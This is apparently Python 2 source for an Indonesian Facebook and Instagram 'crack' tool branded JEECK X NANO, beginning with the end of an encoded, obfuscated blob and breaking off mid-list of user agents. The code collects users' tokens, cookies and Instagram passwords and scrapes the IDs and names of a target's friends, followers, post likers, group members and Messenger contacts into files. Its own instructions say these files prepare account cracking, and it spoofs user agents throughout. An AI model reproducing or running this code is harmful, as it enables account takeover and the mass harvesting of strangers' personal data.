z1z6rKZ55qeuVABTU/+f+lMnKlwDS5jXIdzFnn+PMHQ6Y1PBDfHbd8aZ6T+ZlzVBYvXwcHCbQRLXU5h7/gdy1tUvypl4Fsgf8C+q1RPrqTTnYD3uou/8LZo4Um82PbdtCvSa7zdxqP0tfJt4a0ihAA87gr0B2CZ8hGdKXePsj/miu6RHgvug+H7KxozGZc1aS5Lsw064QU7Ytv1Jwjp7Qp7JZNo4In2abMVJufoPDHZk2EUyFJXkFUo5fKFUiFTyjzM5Zezmjd2Ng31iqVsPpstlgqlh7kMLgLqLRWX8qVCcTmzvFRYzpfk3YuTltdRnkbKFZ6S6TUX0+cdsapj++6j5ZAJUu35UqXl6sVWxzI4y37t8yw4li3kmgxdlwcnqyoIxVhwl0b00VqdFRHdGOlA8LayfE+uqZOeWN3df1Ydc1S52NHYRqVl2JLtwML7Va59tqFiDjcyV8jl8pn/ZmiptLSczxawJi6ISH+86KKnq1kTuBymmtTEm1BIJVWUvkaE0tJj6XsqrpHGTalZSiDcJqiu96tB4AdDMQJRESR7wsXbr2M5iqBg+7gHgTCFqxKnr8p3tBnb9yxNOL5jaXskfDuUUg1qAqeHC3RLajeUhdIB+uqtxjwfQZg3CMJaRoZOx9MUW7xlaYbDHZ2qjkrxoHFrZJj85T9QOfpmAN1Jsmp2dGotX73eEaJtEzTlMxLPRY2bxnXjmpE05oxZI25MYz9rJD557kXuGd8b9/C5M2wfqNi8MY8jPUTNR+oLFKReMPz8M/3TtWt3fastGrSDjZvUXaOOwN2gL5DG/VHInwZP5h65vhk64idaNH1KfR35NnKbnsRf3fGZFA=="))))
def banner(): 
    jeeck("\033[0;36m    _________ __")
    jeeck("\033[0;36m   / ____/ (_) /____  \033[0;00m[\033[0;35m•\033[0;00m] \033[0;36mFB \033[0;00m: \033[0;36mJEECK X NANO")
    jeeck("\033[0;36m  / __/ / / / __/ _ \ \033[0;00m[\033[0;35m•\033[0;00m] \033[0;36mWA \033[0;00m: \033[0;36m081392505882")
    jeeck("\033[0;36m / /___/ / / /_/  __/ \033[0;00m[\033[0;35m•\033[0;00m] \033[0;36mST \033[0;00m: \033[0;00mPremium `︿ˊ ")
    jeeck("\033[0;36m/_____/_/_/\__/\___/  \033[0;00m[\033[0;35m•\033[0;00m] \033[0;36mCD \033[0;00m: \033[0;36mCREATED BY JEECK")
    jeeck("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Your Ip Addres : %s "%(IP))

header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    jeeck("\n\033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m Facebook")
    jeeck("\033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Instagram")
    jeeck("\033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m Donasi")
    jeeck("\033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Tutor Dump Token")
    jeeck("\033[0;36m[\033[0;35m5\033[0;36m]\033[0;00m preliminary ]\033[0;33m[ \033[0;35mPENDAHULUAN PENGGUNA \033[0;33m]")
    jeeck("\033[0;36m[\033[0;35m6\033[0;36m]\033[0;00m DUMP USER-AGENT")
    mrjreckxnanoxxz = raw_input("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Input : ")
    if mrjreckxnanoxxz in(""):
    	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Input Cook")
    elif mrjreckxnanoxxz in ('2','02'):
    	_jeeck_proo__instag()
    	_jeeck_proo__instagg()
    elif mrjreckxnanoxxz in ('6','06'):
        nanoua()
    elif mrjreckxnanoxxz in ('5','05'): 
       pendahuluanxnano()
    elif mrjreckxnanoxxz in ('1','01'):
        
    	jeeckxd = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token Fb : ")
        if jeeckxd in(""):
        	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Fill It Correcttly")
    	try:
            nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(jeeckxd)).json()['name']
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Dont Skipp Dog Run Tools pleasewait")
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Run Tools Back..................?")
            open('data/token.txt', 'w').write(jeeckxd);login_xx()
            jeeckgantenggakadayangsuka = raw_input("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m ENTER COOK")
            _jeeck_proo_()
            exit()
        except (KeyError,IOError):
        	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Token In Fallid ");jeda(2);masuk()
    elif mrjreckxnanoxxz in ('3', '03'):
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Donate Broow ")
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Boonk Doank :V")
        masuk()
    elif mrjreckxnanoxxz in ('4', '04'):
    	os.system(" xdg-open https://youtu.be/p4MjQCD0ej4 ")
    elif mrjreckxnanoxxz in ('0', '00'):
    	exit('\n')
    else:
    	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Wronk Input Dod ");exit()
def nanoua():
   jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Harap Pilih Salah Satu User-Agent")
   jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Anda Akan Di Arahkan Ke Browser")
   jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Please Enter Untuk melanjutkan ke browser")
   raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,)) 
   os.system("xdg-open  https://gist.github.com/pzb/b4b6f57144aea7827ae4")
   xnanopasang()


def xnanopasang():
   jeeck("\n\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m JIKA SUDAH SALIN USER AGENT TADI")
   jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m KALIAN PASANG UA ")
   jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m PILIH NOMOR [1] Facebook - Logintoken")
   jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m JIKA SUDAH KALIAN MULAI KETIK ULANG LAGI UNTUK KE_jeeck_proo_")
   jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m KLIK NOMOR [9] TERUS NOMOR [1] PASTEKAN USERAGENT")
   raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
   masuk()



def pendahuluanxnano():
   jeeck("\033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m Before Crack you have to Replace USERAGENT")
   jeeck("\033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Else : Sebelum Crack anda harus mengganti USERAGENT")
   jeeck("\033[0;36m[\033[0;35m3\033[0;36m]\033[0;00m If you don't replace the crack, it will be an error")
   jeeck("\033[0;36m[\033[0;35m4\033[0;36m]\033[0;00m Karena tidak mengganti Crack Akan EROR")
   jeeck("\033[0;36m[\033[0;35m5\033[0;36m]\033[0;00m If there is a bug, please contact immediately")
   jeeck("\033[0;36m[\033[0;35m6\033[0;36m]\033[0;00m Jika Ada Bug Segera Hubungi ")
   jeeck("\033[0;36m[\033[0;35m7\033[0;36m]\033[0;00m WHATSAP : 081392505882")
   jeeck("\033[0;36m[\033[0;35m8\033[0;36m]\033[0;00m if you want to take useragent select number 6")
   jeeck("\033[0;36m[\033[0;35m9\033[0;36m]\033[0;00m jika ingin mengambil useragent pilih nomor 6")
   raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
   masuk()

host = ('https://mbasic.facebook.com')
ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
def __jeeclxnano_():
	if os.path.exists("data/cookies"):
		if os.path.getsize("data/cookies") !=0:
			return cvd(open('data/cookies').read().strip())
		else:_jeeckxtampanXD_()
	else:_jeeckxtampanXD_()
def _jeeckxtampanXD_(show=True):
	if show==True:
		
		
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Helep Enter Your Cookie")
	ck=raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Cookie : ")
	if ck=="":
		_jeeckxtampanXD_(show=False)
	try:
		cks=cvd(ck)
		if kueh(cks)==True:
			open("data/cookies","w").write(ck);exit("%s[%s+%s] %slogin success, ketik: python2 jeeckxnano-2.py "%(B,J,B,P))
		else:jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Login Not Fallid");_jeeckxtampanXD_(show=True)
	except Exception as e:
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Eror : ")
		_jeeckxtampanXD_(show=False)
def kueh(cookies):
	_wtf_=False
	b=requests.get("https://mbasic.facebook.com/profile.php",headers={'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', 'https://mbasic.facebook.com')), 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'},cookies=cookies).text	
	if "mbasic_logout_button" in b.lower():
		_wtf_=True
		if _wtf_==True:
			return True
		else:
			exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Login Not Fallid ")
def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r
def cvs(cookies): # convert cookie dict to string
	result=[]
	for _i_ in enumerate(cookies.keys()):
		if _i_[0]==len(cookies.keys())-1:result.append(_i_[1]+"="+cookies[_i_[1]])
		else:result.append(_i_[1]+"="+cookies[_i_[1]]+"; ")
	return "".join(result)
def cvd(cookies): 
	result={}
	try:
		for _i_ in cookies.split(";"):
			result.update({_i_.split("=")[0]:_i_.split("=")[1]})
		return result
	except:
		for _i_ in cookies.split("; "):
			result.update({_i_.split("=")[0]:_i_.split("=")[1]})
		return result

def _jeeck_proo__instag():
	global cookie
	try:
		jeeckxd = open("data/ig.txt", "r").read()
	except IOError:
		masuk_ig()
	else:	
		url = "https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5"
		with requests.Session() as ses:
			try:
				otw = ses.get(url, cookies={"cookie": jeeckxd}, headers=headerz_api)
				if "users" in json.loads(otw.content):
					cookie = {"cookie": jeeckxd}
				else:
					jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Cookie Not Fallid ");jeda(2)
					os.system('rm -rf data/ig.txt')
					masuk_ig()	
			except ValueError:
				jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Cookie Not Fallid");jeda(2)
				os.system('rm -rf data/ig.txt')
				masuk_ig()
def masuk_ig():
	global cookie
	jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m To continue the tools, please login to your Instagram account first")
	userrr = raw_input(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Username : ")
	passxnxx = raw_input(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Password : ")
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as ses:
				scr = "https://www.instagram.com/"
				data = ses.get(scr, headers=headerz).content
				toket = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			headerss = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": toket,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
			param = {"username": userrr,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), passxnxx),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
			}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses.post(url, data=param, headers=headerss)
			data = json.loads(respon.content)
			_2 = respon.cookies.get_dict()
			if "userId" in str(data):
				for jeeckxnano in _2:
					with open("data/ig.txt", "a") as simpan:
						simpan.write(jeeckxnano+"="+_2[jeeckxnano]+";")
				
				jeeckxd = open("data/ig.txt","r").read()
				cookie = {"data/ig.txt": jeeckxd}
				print ('');jeda(2)
				jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Login Sucsesfull Run Tools Back");exit()
			elif "checkpoint_url" in str(data):
				jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Account Chekpoint ");jeda(2)
			elif "Please wait" in str(data):
				jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m On Airplane 3 Secconds");jeda(2)
			else:
				jeeck(" \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m Login Eror Please Try Login Again");jeda(2)
				exit()
	except KeyboardInterrupt:
		exit()
None

def publik(jeeckxd,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Type \033[0;33m,ME, \033[0;00mDump Id Fjeeckxd Friends")
        idt = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Target Id : ")
        
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,jeeckxd))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        jeeckxnano = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,jeeckxd))
        z = json.loads(r.text)
        for _x_ in z['friends']['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            jeeckxnano.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
            print ('\r%s[%s+%s]%s Id Target %s =>%s %s ' % (B,J,B,P,M,H,str(len(id)))),
            sys.stdout.flush();jeda(0.0050)

        jeeckxnano.close()

        print ('%s[%s+%s] File dump tersimpan %s=>%s %s '%(B,J,B,P,K,file))
        raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
        _jeeck_proo_()
    except Exception as e:
        exit("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Dump Id Erored Broww")

def followers(jeeckxd,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Type ,ME, Dump Folowers Alone ")
        idt = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Target Id : ")
        batas = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Maxs Id : ")
        
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,jeeckxd))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        jeeckxnano = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,jeeckxd))
        z = json.loads(r.text)
        for _x_ in z['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            jeeckxnano.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
            print ('\r%s[%s+%s]%s Id Target %s =>%s %s ' % (B,J,B,P,M,H,str(len(id)))),
            sys.stdout.flush();jeda(0.0050)

        jeeckxnano.close()
        print ('\n\n%s[%s+%s]%s Succes dump followers  %s '%(B,J,B,P,nm["name"]))
        print ('%s[%s+%s]%s File Dump Saved In %s=>%s %s '%(B,J,B,P,M,H,file))
        raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
        _jeeck_proo_()
    except Exception as e:
        exit("Eror Dump Brooh")

def postingan(jeeckxd,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Emter Your Id Postingan Target ")
        idt = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Id Target : ")
        simpan = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m File Name : ")
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,jeeckxd))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        jeeckxnano = open(file, 'w')
        for _x_ in z['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            jeeckxnano.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
            print ('\r%s[%s+%s]%s Id Target %s =>%s %s ' % (B,J,B,P,M,H,str(len(id)))),
            sys.stdout.flush();jeda(0.0050)

        jeeckxnano.close()
        print ('\n\n%s[%s+%s]%s Succes Dump Id Postingamln '%(B,J,B,P,))
        print ('%s[%s+%s]%s File dump tersimpan %s=>%s %s '%(B,J,B,P,M,H,file))
        raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
        _jeeck_proo_()
    except Exception as e:
        exit(" Eror Dump Id ")

class group:
	
	def __init__(self, cookies):
		self.glist=[]
		self.cookies=cookies
		self.manual();exit()
	def manual(self):
		id=raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Id Groups : ")
		if id in(""):
			self.manual()
		else:
			_r_=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/groups/"+id,headers=hdcok(),cookies=self.cookies).text,"html.parser")
			if "konten tidak" in _r_.find("title").text.lower():
				exit("Help Input Id Which Fallid Dog")
			else:
				self.listed={"id":id,"name":_r_.find("title").text}
				self.jeeck_xnano_xx()
				print("%s[%s+%s]%s NIck Name grup%s= > %s%s.."%(B,J,B,P,M,H,self.listed.get("name")[0:20]))
				self.dumps("https://mbasic.facebook.com/groups/"+id)
	def jeeck_xnano_xx(self):
		self.fl=raw_input('%s[%s+%s] NIck Name file %s=> %s'%(B,J,B,M,K)).replace(" ","_")
		if self.fl=='':self.jeeck_xnano_xx()
		open(self.fl,"w").close()
	def dumps(self, url):
		_r_=bs4.BeautifulSoup(requests.get(url,cookies=self.cookies,headers=hdcok()).text,"html.parser")
		print("\r%s[%s+%s] %sCollect Id %s=> %s%s \x1b[0;97m- Please Waite......\r"%(B,J,B,S,M,H,str(len(open(self.fl).read().splitlines()))))
		sys.stdout.flush();jeda(0.0050)
		for _i_ in _r_.find_all("h3"):
			try:
				if len(bs4.re.findall("\/",_i_.find("a",href=True).get("href")))==1:
					ogeh=_i_.find("a",href=True)
					if "profile.php" in ogeh.get("href"):
						_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
						if len(_a_)==0:continue
						elif _a_ in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write("%s<=>%s\n"%(_a_,ogeh.text))
							continue
					else:
						_a_="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
						if len(_a_)==0:continue
						elif _a_ in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write("%s<=>%s\n"%(_a_,ogeh.text))
			except:continue
		for _i_ in _r_.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in _i_.text:
				while True:
					try:
						self.dumps("https://mbasic.facebook.com/"+_i_.get("href"))
						break
					except Exception as e:
						print("\r\x1b[0;91m[+]%s, retrying..."%e);continue
		print ('\n\n%s[+] Succes dump id member group '%(H,));print ('%s[%s+%s]%s File dump Saved In %s=>%s %s '%(B,J,B,P,M,H,self.fl));raw_input('\n%s[%s+%s] [%s Enter%s ] '%(B,J,B,U,O));_jeeck_proo_()
def cek(arg):
	if os.path.exists("data/cookies"):
		if os.path.getsize("data/cookies") !=0:
			return True
		else:return False
	else:return False

def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        try:
            cookie = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Enter Cookie : ")
            cvds = cvd(cookie)
            new = True
        except:
            jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Cookies Not Fallid");dumpfl()
    else:
        cvds = cvd(open('data/cookies').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        if kueh(cvds) != True:
            exitjeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Language Detectionts Eror")
        
        if new == True:
            open('data/cookies', 'w').write(cookie)
        sim=raw_input("\n%s[%s+%s] %sName File %s:%s "%(B,J,B,P,M,K)).replace(" ","_")
        print ("%s[%s+%s] %sExample Name %s[ %sAisyah Chans %s]"%(B,J,B,P,M,H,M))
        s=raw_input("%s[%s+%s] %sSett Name %s=> %s"%(B,J,B,P,M,K))
        if s in("xnano","Xnano","XNANO","Xnano Jeeck","Xnano jeeck","XNANO JEECK","xnano jeeck"):
        	print("\n%s[%s+%s] %sanak anjing mau crack pake nama gw "%(B,J,B,P));exit()
        elif s in("Xnano Jeeck","Xnano jeeck","XNANO JEECK","xnano jeeck"):
        	print ("\n%s[%s+%s] %sJeeck X Nano Xx Brutall"%(B,J,B,P));exit()
        namah(sim,cvds,"https://mbasic.facebook.com/search/people/?q="+s)
    else:
        try:
            os.remove('data/cookies')
        except:
            pass
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Login Eror")
        dumpfl()
    return
def namah(sim,r,b):
	open(sim,"a+")
	b=bs4.BeautifulSoup(requests.get(b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		
		print("\r%s[%s+%s] %s Collect Id %s=> %s%s \x1b[0;97m- Pleasewait..."%(B,J,B,P,M,H,str(len(open(sim).read().splitlines())))),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
		if "Lihat Hasil Selanjutnya" in i.text:
			namah(sim,r,i["href"])
	print ('\n\n%s[+]%s Succes dump id nick name '%(H,til));print ('%s[%s+%s]%s File Saved In %s=>%s %s '%(B,J,B,P,M,H,sim));raw_input('\n%s[%s+%s] [%s Enter%s ] '%(B,J,B,U,O));_jeeck_proo_()

class pesan:

    def __init__(self, cookies):
        self.cookies = cookies
        
        self.f = raw_input('\n%s[%s+%s] File Nick%s =>%s '%(B,J,B,M,K)).replace(' ', '_')
        if self.f == '':
            pesan(cookies)
        open(self.f, 'w').close()
        self.dump('https://mbasic.facebook.com/messages')
    def dump(self,url):
    	open(self.f, 'a+')
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        print ("\r%s%s%s mengumpulkan id %s> %s%s \x1b[0;97m- mohon tunggu\r"%(B,til,P,M,H,str(len(open(self.f).read().splitlines()))));sys.stdout.flush();jeda(0.0050)
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                except Exception as e:
                    continue
            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://mbasic.facebook.com/' + i.get('href'))
        print ('\n%s%s Succes dump id pesan mesengger '%(H,til))
        print ('%s%s%s File dump tersimpan %s=>%s %s '%(B,til,P,M,H,self.f))
        raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,));_jeeck_proo_()

def r_ikut(cookie, id_target, limit, lpg):
	global looping
	if lpg in[""]:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);exit()
	elif lpg in["1","01"]:
		url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
	elif lpg in["2","02"]:
		url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
	else:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);exit()
	with requests.Session() as ses:
		otw = ses.get(url, cookies=cookie, headers=headerz_api)
		for _j_ in json.loads(otw.content)["users"]:
			username = _j_["username"]
			nama = _j_["full_name"].encode("utf-8")
			if len(status_foll) != 1:
				print "\r%s•%s Total user%s > %s%s"%(U,O,M,K,len(mi)),
				sys.stdout.flush()
				mi.append(username+"|"+nama.decode("utf-8"))
				looping+=1
			else:
				poll.append(username)
None
 
ugent = random.choice([
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
"NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
"Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
"Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
